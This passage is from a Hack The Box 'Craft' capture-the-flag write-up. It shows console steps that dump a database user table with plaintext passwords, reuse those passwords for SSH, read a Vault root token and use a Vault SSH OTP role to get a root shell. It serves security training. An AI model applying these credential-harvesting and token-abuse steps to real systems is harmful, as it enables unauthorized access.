+&lt;/code>&lt;/pre>&lt;p>And post that, we ran the script, and we get 2 tables one that looks interesting named &lt;code>user&lt;/code>, we modify again the sql query but to select all the records from that table:&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">/opt/app # python dbtest.py
+[{'Tables_in_craft': 'brew'}, {'Tables_in_craft': 'user'}]
+/opt/app # sed -i 's/sql \= \&amp;quot;show tables\&amp;quot;/sql \= \&amp;quot;SELECT * FROM user\&amp;quot;/' dbtest.py
+/opt/app # python dbtest.py
+[{'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'}, {'id': 4, 'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'}, {'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}]
+/opt/app #
+&lt;/code>&lt;/pre>&lt;p>So, we got the users &lt;code>dinesh, ebachman and gilfoyle&lt;/code> and it&amp;rsquo;s respective passwords, with that we go to &lt;code>https://gogs.craft.htb&lt;/code> again and login as &lt;code>gilfoyle&lt;/code> and we found that he has a private repo to deploy the infra called &lt;code>craft-infra&lt;/code>&lt;/p>
+&lt;img src="https://ceso.github.io/images/htb/craft/1-gil.png" class="center" style="border-radius: 8px;" />
+&lt;img src="https://ceso.github.io/images/htb/craft/2-gil.png" class="center" style="border-radius: 8px;" />
+&lt;p>We notice there exists a &lt;code>.ssh&lt;/code> folder, we look into it and we get a pair of public/private ssh keys:&lt;/p>
+&lt;img src="https://ceso.github.io/images/htb/craft/3-gil.png" class="center" style="border-radius: 8px;" />
+&lt;p>We try to login via ssh as &lt;code>gilfoyle&lt;/code> re-using the password we got earlier and we found a success (actually the first tries it failed for me, and spent some hours trying to break the id_rsa with john without success, so give a new try with trying the founded passwords):&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/craft# ssh gilfoyle@10.10.10.110 -i id_rsa
+. * .. . * *
+* * @()Ooc()* o .
+(Q@*0CG*O() ___
+|\_________/|/ _ \
+| | | | | / | |
+| | | | | | | |
+| | | | | | | |
+| | | | | | | |
+| | | | | | | |
+| | | | | \_| |
+| | | | |\___/
+|\_|__|__|_/|
+\_________/
+Enter passphrase for key 'id_rsa':
+Linux craft.htb 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Fri Jan 3 23:45:10 2020 from 10.10.14.16
+gilfoyle@craft:~$ id
+uid=1001(gilfoyle) gid=1001(gilfoyle) groups=1001(gilfoyle)
+gilfoyle@craft:~$ wc -c user.txt
+33 user.txt
+&lt;/code>&lt;/pre>&lt;h2 id="root">root&lt;/h2>
+&lt;p>We start enumerating to see if we can find anything interesting in the home of gilfoyle, and we found a &lt;code>.vault-token&lt;/code> file (vault is a tool for securely access/store secrets as tokens, passowrds, certificates, etc, to learn more about it go to &lt;a href="https://www.vaultproject.io/">Vault project page&lt;/a>), and try to login to vault with it which goes well.&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">gilfoyle@craft:~$ cat .vault-token
+f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9gilfoyle@craft:~$ vault login
+Token (will be hidden):
+Success! You are now authenticated. The token information displayed below
+is already stored in the token helper. You do NOT need to run &amp;quot;vault login&amp;quot;
+again. Future Vault requests will automatically use this token.
+Key Value
+--- -----
+token f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9
+token_accessor 1dd7b9a1-f0f1-f230-dc76-46970deb5103
+token_duration ∞
+token_renewable false
+token_policies [&amp;quot;root&amp;quot;]
+identity_policies []
+policies [&amp;quot;root&amp;quot;]
+gilfoyle@craft:~$
+&lt;/code>&lt;/pre>&lt;p>We go back to the repo of &lt;code>craft-infra&lt;/code> inside the &lt;code>vault&lt;/code> folder to see if we can find the secret stored, in it is a small script &lt;code>secrets.sh&lt;/code> which has exactly what we need:
+&lt;img src="https://ceso.github.io/images/htb/craft/4-gil.png" class="center" style="border-radius: 8px;" />
+with this information we run vault to get the kv if the secret is indeed there:&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">gilfoyle@craft:~$ vault kv get ssh/roles/root_otp
+========== Data ==========
+Key Value
+--- -----
+allowed_users n/a
+cidr_list 0.0.0.0/0
+default_user root
+exclude_cidr_list n/a
+key_type otp
+port 22
+&lt;/code>&lt;/pre>&lt;p>We know it is a ssh secret for root (that means, we can use it to establish a connection against root over ssh) with an otp key (&lt;a href="https://en.wikipedia.org/wiki/One-time_password">One-Time Password&lt;/a>)
+We check what options vault provides to use it:&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">gilfoyle@craft:~$ vault
+Usage: vault &amp;lt;command&amp;gt; [args]
+Common commands:
+read Read data and retrieves secrets
+write Write data, configuration, and secrets
+delete Delete secrets and configuration
+list List data or secrets
+login Authenticate locally
+agent Start a Vault agent
+server Start a Vault server
+status Print seal and HA status
+unwrap Unwrap a wrapped secret
+Other commands:
+audit Interact with audit devices
+auth Interact with auth methods
+kv Interact with Vault's Key-Value storage
+lease Interact with leases
+namespace Interact with namespaces
+operator Perform operator-specific tasks
+path-help Retrieve API help for paths
+plugin Interact with Vault plugins and catalog
+policy Interact with policies
+secrets Interact with secrets engines
+ssh Initiate an SSH session
+token Interact with tokens
+gilfoyle@craft:~$ vault ssh -h
+Usage: vault ssh [options] username@ip [ssh options]
+Establishes an SSH connection with the target machine.
+This command uses one of the SSH secrets engines to authenticate and
+automatically establish an SSH connection to a host. This operation requires
+that the SSH secrets engine is mounted and configured.
+SSH using the OTP mode (requires sshpass for full automation):
+$ vault ssh -mode=otp -role=my-role user@1.2.3.4
+SSH using the CA mode:
+$ vault ssh -mode=ca -role=my-role user@1.2.3.4
+SSH using CA mode with host key verification:
+$ vault ssh \
+-mode=ca \
+-role=my-role \
+-host-key-mount-point=host-signer \
+-host-key-hostnames=example.com \
+user@example.com
+For the full list of options and arguments, please see the documentation.
+&lt;/code>&lt;/pre>&lt;p>Is clear is needed to execute something like &lt;code>vault ssh -mode=otp -role=my-role user@1.2.3.4&lt;/code>, so we do it:&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">gilfoyle@craft:~$ vault ssh -mode=otp -role=root_otp root@127.0.0.1
+Vault could not locate &amp;quot;sshpass&amp;quot;. The OTP code for the session is displayed
+below. Enter this code in the SSH password prompt. If you install sshpass,
+Vault can automatically perform this step for you.
+OTP for the session is: 6290d45c-541f-fb96-32c7-3e5a8aa4a256
+. * .. . * *
+* * @()Ooc()* o .
+(Q@*0CG*O() ___
+|\_________/|/ _ \
+| | | | | / | |
+| | | | | | | |
+| | | | | | | |
+| | | | | | | |
+| | | | | | | |
+| | | | | \_| |
+| | | | |\___/
+|\_|__|__|_/|
+\_________/
+Password:
+Linux craft.htb 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sat Jan 4 00:46:56 2020 from 127.0.0.1
+root@craft:~# wc -c root.txt
+33 root.txt
+root@craft:~#
+&lt;/code>&lt;/pre>&lt;p>And we own root!!
+Again I enjoyed quite a lot doing this box a few hours it was going to be retired, and again thanks @Frundrod and &lt;a href="https://www.hackthebox.eu/profile/103596">@Fugl&lt;/a> for pointing me in the right direction.&lt;/p>
+&lt;p>Thanks a lot for reading, and until the next write-up.&lt;/p></description></item></channel></rss>
